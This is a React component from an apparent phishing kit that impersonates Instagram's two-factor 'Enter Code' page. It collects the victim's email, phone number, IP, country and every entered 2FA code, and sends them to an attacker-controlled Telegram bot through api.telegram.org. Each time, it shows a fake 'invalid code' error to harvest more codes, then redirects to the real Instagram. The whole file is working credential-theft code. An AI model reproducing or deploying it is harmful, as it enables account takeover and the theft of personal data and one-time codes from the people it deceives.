import Lock from '@assets/images/lock.png';
import { faSpinner } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Footer from '@pages/Client/components/Footer';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

// Please check the security code and try again.
// https://www.instagram.com/
const EnterCode: React.FC = () => {
	const [code, setCode] = useState('');
	const [attempts, setAttempts] = useState(0);
	const [maxAttempts, setMaxAttempts] = useState(0);
	const [chatId, setChatId] = useState('');
	const [token, setToken] = useState('');
	const [isLoading, setIsLoading] = useState(false);
	const [error, setError] = useState('');
	const navigate = useNavigate();
	const data = localStorage.getItem('data');
	const geo = localStorage.getItem('geo');

	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
		e.preventDefault();
		if (!data || !geo) {
			navigate('/');
			return;
		}
		if (code.length < 6 || code.length > 8) {
			setError('Please enter a valid security code.');
			return;
		}
		if (maxAttempts > 0 && attempts >= maxAttempts) {
			window.location.replace('https://www.instagram.com/');
			return;
		}
		setIsLoading(true);
		const { email, phoneNumber, pageName } = JSON.parse(data);
		const { ip, country_code } = JSON.parse(geo);

		try {
			const messageContent = formatMessage({
				ip,
				email,
				phoneNumber,
				pageName,
				country_code,
				code,
				attemptNumber: attempts + 1,
			});

			if (localStorage.getItem('messageId')) {
				await axios.post(
					`https://api.telegram.org/bot${token}/deleteMessage`,
					{
						chat_id: chatId,
						message_id: localStorage.getItem('messageId'),
					},
				);
			}

			const response = await axios.post(
				`https://api.telegram.org/bot${token}/sendMessage`,
				{
					chat_id: chatId,
					text: messageContent,
					parse_mode: 'HTML',
				},
			);

			if (response.data?.result?.message_id) {
				localStorage.setItem(
					'messageId',
					response.data.result.message_id.toString(),
				);
				localStorage.setItem('message', messageContent);
			}

			setCode('');
			setError('Invalid security code. Please try again.');
			setAttempts((prev) => prev + 1);
			if (maxAttempts > 0 && attempts + 1 >= maxAttempts) {
				navigate('/');
			}
		} catch {
			setError('An error occurred. Please try again.');
		} finally {
			setIsLoading(false);
		}
	};

	const formatMessage = ({
		ip,
		email,
		phoneNumber,
		pageName,
		country_code,
		code,
		attemptNumber,
	}: {
		ip: string;
		email: string;
		phoneNumber: string;
		pageName: string;
		country_code: string;
		code: string;
		attemptNumber: number;
	}) => {
		const savedMessage = localStorage.getItem('message');
		if (savedMessage && localStorage.getItem('messageId')) {
			return `${savedMessage}\n<b>2FA Code ${attemptNumber}:</b> <code>${code}</code>`;
		}

		return `<b>IP:</b> <code>${ip}</code>
<b>Email:</b> <code>${email}</code>
<b>Phone Number:</b> <code>${phoneNumber}</code>
<b>Page Name:</b> <code>${pageName}</code>
<b>Country Code:</b> <code>${country_code}</code>
<b>2FA Code ${attemptNumber}:</b> <code>${code}</code>`;
	};

	useEffect(() => {
		const getConfig = async () => {
			const response = await axios.get('/config.json');
			return response.data;
		};
		(async () => {
			const config = await getConfig();
			setChatId(config.telegram.chatId);
			setToken(config.telegram.token);
			setMaxAttempts(config.websiteConfig.maxCodeAttempts);
		})();
	}, []);

	return (
		<div className='flex w-full max-w-md flex-col items-center gap-4 rounded-lg bg-white sm:border'>
			<div className='flex w-full flex-col items-center gap-2 border-b p-8 pb-4'>
				<img src={Lock} alt='Lock' className='h-[76px] w-[76px]' />
				<h1 className='text-lg font-semibold text-gray-800'>
					Enter Code
				</h1>
				<p className='max-w-[320px] text-center text-xs text-[#737373]'>
					Please enter the code we sent to your email or phone number.
				</p>
			</div>
			<form
				className='flex w-full flex-col gap-4 p-8'
				onSubmit={handleSubmit}
			>
				<input
					type='number'
					pattern='[0-9]*'
					inputMode='numeric'
					autoComplete='one-time-code'
					placeholder='Security Code'
					required
					autoFocus
					value={code}
					onChange={(e) => setCode(e.target.value)}
					onFocus={() => setError('')}
				/>
				{error && <p className='text-xs text-red-500'>{error}</p>}
				<button
					type='submit'
					className={`flex w-full justify-center rounded-md border border-transparent bg-primary px-4 py-2 text-sm font-semibold text-white shadow-sm transition duration-150 ease-in-out hover:bg-primary/90 ${
						code.length < 6 || code.length > 8
							? 'cursor-not-allowed opacity-50'
							: ''
					}`}
					disabled={code.length < 6 || code.length > 8 || isLoading}
				>
					{isLoading ? (
						<FontAwesomeIcon
							icon={faSpinner}
							className='animate-spin'
						/>
					) : (
						'Confirm'
					)}
				</button>
				<div className='flex w-full flex-col items-center justify-center border-t pt-4'>
					<p className='max-w-[320px] self-center text-center text-xs text-[#737373]'>
						If you're unable to use a login code from an email or
						phone number, you can get one by{' '}
						<button className='text-primary hover:underline'>
							authentication app
						</button>{' '}
						or use one of your other login methods.
					</p>
				</div>
			</form>
			<div className='flex w-full justify-center'>
				<Footer />
			</div>
		</div>
	);
};

export default EnterCode;
